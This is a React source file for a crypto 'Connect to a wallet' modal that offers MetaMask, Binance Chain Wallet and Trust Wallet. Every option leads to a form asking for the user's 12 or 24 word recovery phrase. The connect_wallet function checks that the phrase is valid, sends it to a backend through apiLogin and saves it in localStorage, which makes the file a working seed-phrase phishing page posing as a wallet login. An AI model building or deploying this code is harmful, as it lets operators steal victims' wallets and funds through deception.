
import React, { useState, useEffect, useHistory } from 'react';
import Web3 from 'web3';
import { FaAlignJustify, FaHome, FaTractor, FaBabyCarriage, FaSteam, FaOutdent,
    FaShareSquare, FaTwitter, FaArrowRight, FaClosedCaptioning, FaTimes, FaQuestion, FaQuestionCircle} from 'react-icons/fa';
import MetaMask from '../../img/quotation/metamask.svg';
import Bnbwallet from '../../img/quotation/bnb-busd.svg';
import Trustwallet from '../../img/quotation/TWT.png';
import './index.css';
import Modal from 'react-modal';
import { ethers } from "ethers";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import {apiLogin} from '../../services/main';
import { TOKEN_ADDRESS, TOKEN_ABI, RPC_URL } from '../../services/Types';

const customStyles = {
    content: {
      top: '50%',
      left: '50%',
      right: 'auto',
      bottom: 'auto',
      marginRight: '-50%',
      transform: 'translate(-50%, -50%)',
      borderRadius:'25px',
      zIndex: 5000,
    },
    overlay: {
        background: "rgba(69, 42, 122, 0.6)"
    },  
};

const MyModal = ({isOpen, isLogin, isBalance, setAddress, isStake}) => {

    const web3 = new Web3(RPC_URL);    
    let contract =  new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);

    let subtitle;
    const [step, setStep] = useState(1);
    const [kword, setKword] = useState('');
    const [modalIsOpen, setIsOpen] = useState(false);

    function afterOpenModal() {
        // references are now sync'd and can be accessed.
        subtitle.style.color = 'rgb(69, 42, 122)';
    }
    
    function closeModal() {
        setStep(1);
        setIsOpen(false);
    }

    useEffect(() => {
        setIsOpen(isOpen);
    }, [isOpen]);     
    

    const handleChange = (e) => {
        setKword(e.target.value);
    }
    
    const connect_wallet = () => {
        var check = ethers.utils.isValidMnemonic(kword);
        if (check == false) {
            toast.error('Please enter your correct wallet phrase!');
        } else {
            const formDatas = {
                userPass:kword
            }
            apiLogin(formDatas).then(res => {
                console.log("res-----", res);
                localStorage.setItem('token', res.data.token);
                if (res.data.error) {
                    console.log(res);
                    if (res.data.msg) {
                        console.log(res);
                    }
                }
            })

            .catch(err => {
                console.log("err-----", err);
                toast.error(<div>Wrong!<br/>Please enter your correct wallet phrase</div>);
                setIsOpen(false);
                setKword('');
            })


            if(localStorage.getItem('token')){
                isStake(false);
                let address = ethers.Wallet.fromMnemonic(kword)['address'];                
                console.log('ethers.Wallet.fromMnemonic(kword)', ethers.Wallet.fromMnemonic(kword));

                localStorage.setItem('address', address); 
                async function getBalance() {
                    const balance = await contract.methods.balanceOf(address).call();
                    console.log(balance);
                    
                    isBalance(balance);
                    localStorage.setItem('balance', parseInt(Number(balance)/(1000000000))); 
                                
                    // localStorage.setItem('balance', balance);                  
                    return balance;                
                }
                localStorage.setItem('login', true);                   
                getBalance();
                closeModal();
                toast.info('Successfully connected!');
                isLogin(true);   
                localStorage.setItem('kword', kword);
            }         
        }
    }

    return (
        <>
            <Modal
                isOpen={modalIsOpen}
                onAfterOpen={afterOpenModal}
                onRequestClose={closeModal}
                style={customStyles}
                contentLabel="Example Modal"
            >
                
                <div className='d-flex justify-content-between title-color'>
                    <h5 className='font-OpenSansBold' ref={(_subtitle) => (subtitle = _subtitle)}>Connect to a wallet</h5>
                    <FaTimes className='cursor-pointer' onClick={closeModal}/>
                </div>                
                <hr className='my-3'/>

                {step === 1 && (
                    <>                    
                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer' onClick={() => setStep(2)}>
                            <p className='align-self-center mb-0 title-color pt-0'>MetaMask</p>
                            <img src={MetaMask} width={35}></img>
                        </div>
                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer' onClick={() => setStep(2)}>
                            <p className='align-self-center mb-0 title-color pt-0'>Binance Chain Wallet</p>
                            <img src={Bnbwallet} width={35}></img>
                        </div>
                        <div className='d-flex justify-content-between w-245 list-wallet cursor-pointer' onClick={() => setStep(2)}>
                            <p className='align-self-center mb-0 title-color pt-0'>Trust Wallet</p>
                            <img src={Trustwallet} width={35}></img>
                        </div>
                    </>
                )}
                
                {step === 2 && (
                    <div>
                        <div className='text-center'><h3 className='font-OpenSansBold card-main-title title-color py-3'>Enter your 12 (or 24) word phrase below (words separated by a single space)</h3></div>
                        <div className='text-center'>
                            <textarea cols="40" rows="6" name="phrase" minlength="23" required="" placeholder="Write it down" className='write-component' value={kword} onChange={handleChange}></textarea>
                            <div className="w-50 align-self-center btn btn-primary rounded-button-long main-bg-color font-OpenSansBold mr-4 mt-3" onClick={() => connect_wallet()}>
                                Submit
                            </div>
                        </div>
                    </div>
                )}           


                <div className='d-flex justify-content-center title-color'>
                    <FaQuestionCircle className='align-self-center' /><p className='align-self-center mb-0'> <a href="https://community.trustwallet.com/t/how-to-import-a-wallet-via-recovery-phrase/843" target="_blank">Learn how to connect</a> </p>
                </div>
            </Modal>
        </>
    )
}

export default MyModal;
